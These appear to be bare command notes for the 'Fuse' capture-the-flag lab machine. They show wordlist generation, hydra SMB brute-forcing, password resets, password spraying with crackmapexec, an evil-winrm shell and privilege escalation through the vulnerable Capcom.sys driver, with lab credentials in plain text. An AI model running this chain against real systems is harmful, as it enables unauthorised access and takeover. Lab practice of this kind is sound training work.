fuse
cewl -w pwd.txt --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm

hydra -L users.txt -P pwd.txt 10.10.10.193 smb

smbclient -L 10.129.2.5 -U tlavel
smbpasswd -r 10.129.2.5 -U tlavel
Fabricorp01
Password@123987


rpcclient -U tlavel 10.129.2.5
$fab@s3Rv1ce$1
enumprinters

Password@123987


crackmapexec winrm 10.129.2.5 -u users.txt -p '$fab@s3Rv1ce$1'


evil-winrm -i 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1'


Download Capcom.sys
Download ExploitCapcom.exe
whoami /priv
upload /root/Downloads/Capcom.sys .
upload /root/Downloads/ExploitCapcom.exe .


.\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys
.\ExploitCapcom.exe EXPLOIT whoami